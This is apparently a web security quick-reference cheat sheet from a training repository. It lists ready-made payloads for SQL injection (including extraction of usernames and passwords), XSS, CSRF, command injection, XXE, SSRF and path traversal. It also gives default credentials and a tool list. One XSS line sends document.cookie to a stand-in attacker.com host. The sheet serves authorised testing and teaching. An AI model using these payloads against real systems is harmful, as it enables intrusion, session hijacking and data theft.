# Quick Reference: Web Security Vulnerabilities

Fast lookup guide for common web vulnerabilities, payloads, and prevention techniques.

## 🔍 Quick Detection

| Vulnerability | Quick Test | Tool |
|--------------|------------|------|
| SQL Injection | `' OR '1'='1` | SQLMap |
| XSS | `<script>alert(1)</script>` | Burp Suite |
| CSRF | Remove/modify token | Browser DevTools |
| Command Injection | `; whoami` | Manual testing |
| XXE | `<!ENTITY xxe SYSTEM "file:///etc/passwd">` | Burp Suite |
| SSRF | `url=http://localhost` | Burp Collaborator |
| Path Traversal | `../../../etc/passwd` | Manual testing |
| Open Redirect | `?url=http://evil.com` | Manual testing |

## 💉 SQL Injection - Quick Payloads

```sql
-- Authentication bypass
admin' --
admin' #
' OR 1=1--
admin' OR '1'='1

-- UNION injection (2 columns)
' UNION SELECT NULL,NULL--
' UNION SELECT username,password FROM users--

-- Blind SQLi
' AND 1=1--  (true)
' AND 1=2--  (false)
' AND SLEEP(5)--

-- Database enumeration
' UNION SELECT database(),NULL--
' UNION SELECT table_name,NULL FROM information_schema.tables--
```

## 🎭 XSS - Quick Payloads

```html
<!-- Basic -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

<!-- Cookie stealing -->
<script>fetch('http://attacker.com/?c='+document.cookie)</script>

<!-- Bypass filters -->
<ScRiPt>alert(1)</sCrIpT>
<img src=x onerror="alert(String.fromCharCode(88,83,83))">
```

## 🔐 CSRF - Quick Test

```html
<!-- Auto-submit form -->
<form action="http://target.com/transfer" method="POST">
    <input name="to" value="attacker">
    <input name="amount" value="1000">
</form>
<script>document.forms[0].submit();</script>
```

## 💻 Command Injection - Quick Payloads

```bash
; ls -la
&& whoami
| cat /etc/passwd
`whoami`
$(cat /etc/passwd)

# Bypass spaces
cat</etc/passwd
cat$IFS/etc/passwd
```

## 🔀 XXE - Quick Payload

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

## 🌐 SSRF - Quick Tests

```
http://localhost
http://127.0.0.1
http://169.254.169.254/latest/meta-data/  (AWS)
file:///etc/passwd
```

## 🔓 Path Traversal - Quick Payloads

```
../../../etc/passwd
....//....//....//etc/passwd
..%2f..%2f..%2fetc%2fpasswd
```

## 🔑 Authentication Testing

```bash
# Default credentials
admin:admin
admin:password
root:root

# JWT manipulation
# Change algorithm to "none"
# Decode, modify payload, encode

# Session fixation
?PHPSESSID=attacker_session_id
```

## 🛠️ Essential Tools

| Tool | Purpose | Command |
|------|---------|---------|
| **Burp Suite** | Web proxy & scanner | GUI application |
| **SQLMap** | SQL injection | `sqlmap -u "URL"` |
| **OWASP ZAP** | Web scanner | `zap-cli quick-scan URL` |
| **Nikto** | Web server scanner | `nikto -h URL` |
| **wfuzz** | Web fuzzer | `wfuzz -w wordlist URL/FUZZ` |
| **ffuf** | Fast fuzzer | `ffuf -w wordlist -u URL/FUZZ` |

## 🔐 Security Headers

```
Content-Security-Policy: default-src 'self'
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Strict-Transport-Security: max-age=31536000
X-XSS-Protection: 1; mode=block
```

## 🐛 Bug Bounty Quick Checklist

- [ ] Test all input fields for SQLi
- [ ] Test reflected parameters for XSS
- [ ] Check for CSRF tokens on state-changing operations
- [ ] Test file upload functionality
- [ ] Look for IDOR in URLs (user_id, document_id, etc.)
- [ ] Test for open redirects
- [ ] Check for SSRF in URL parameters
- [ ] Test XXE if XML input is accepted
- [ ] Look for exposed .git, .env, config files
- [ ] Test API endpoints for authentication bypass
- [ ] Check rate limiting on sensitive endpoints
- [ ] Test password reset functionality
- [ ] Look for subdomain takeovers
- [ ] Test CORS configurations

## 📚 Quick References

- **OWASP Top 10**: https://owasp.org/www-project-top-ten/
- **PayloadsAllTheThings**: https://github.com/swisskyrepo/PayloadsAllTheThings
- **HackerOne Reports**: https://hackerone.com/hacktivity
- **PortSwigger Cheat Sheets**: https://portswigger.net/web-security/sql-injection/cheat-sheet

## ⚠️ Legal Notice

**IMPORTANT**: Only test on:
- Your own applications
- Bug bounty programs
- Authorized penetration tests
- Training platforms (WebGoat, DVWA, Juice Shop, etc.)

Unauthorized testing is illegal and unethical!

---

For detailed explanations and prevention techniques, see:
- [Web Security Cheatsheet](../cheatsheets/web-security.md)
- [Web Security Exercises](./README.md)
